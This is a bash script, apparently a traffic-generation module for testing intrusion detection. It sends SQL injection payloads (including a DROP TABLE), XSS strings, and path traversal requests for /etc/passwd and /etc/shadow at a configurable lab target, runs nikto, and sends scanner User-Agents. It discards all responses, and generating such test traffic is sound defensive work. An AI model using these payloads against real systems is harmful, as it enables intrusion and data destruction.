#!/usr/bin/env bash
# attacks/http.sh — HTTP attack module (SQLi, XSS, traversal, scanners)
set -euo pipefail

BASE="${HTTP_TARGET:-http://${TARGET:-10.10.10.1}}"

echo "[http] Starting HTTP module → $BASE"

UA_NIKTO="Mozilla/5.0 (Nikto/2.1.6)"
UA_SQLMAP="sqlmap/1.7 (https://sqlmap.org)"

# 1. SQL injection probes
echo "[http] SQL injection probes..."
SQLI_PAYLOADS=("'" "1' OR '1'='1" "1; DROP TABLE users--" "' UNION SELECT 1,2,3--")
for payload in "${SQLI_PAYLOADS[@]}"; do
    curl -sk -A "$UA_SQLMAP" "${BASE}/?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" \
        -o /dev/null -w "%{http_code}" 2>/dev/null || true
done

# 2. XSS probes
echo "[http] XSS probes..."
XSS_PAYLOADS=('<script>alert(1)</script>' '"><img src=x onerror=alert(1)>')
for payload in "${XSS_PAYLOADS[@]}"; do
    curl -sk "${BASE}/?q=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")" \
        -o /dev/null 2>/dev/null || true
done

# 3. Path traversal
echo "[http] Path traversal probes..."
TRAVERSAL_PATHS=("/../../../etc/passwd" "/./././etc/shadow" "/%2e%2e/%2e%2e/etc/passwd")
for path in "${TRAVERSAL_PATHS[@]}"; do
    curl -sk "${BASE}${path}" -o /dev/null 2>/dev/null || true
done

# 4. Nikto scanner (if available)
if command -v nikto >/dev/null 2>&1; then
    echo "[http] Running nikto (quick scan)..."
    nikto -h "$BASE" -maxtime 30s -Format txt -output /dev/null 2>/dev/null || true
fi

# 5. Common scanner User-Agent strings
echo "[http] Emitting scanner User-Agents..."
for ua in "Nikto/2.1.6" "sqlmap/1.7" "masscan/1.3" "zgrab/0.x"; do
    curl -sk -A "$ua" "$BASE/" -o /dev/null 2>/dev/null || true
done

echo "[http] Module complete."
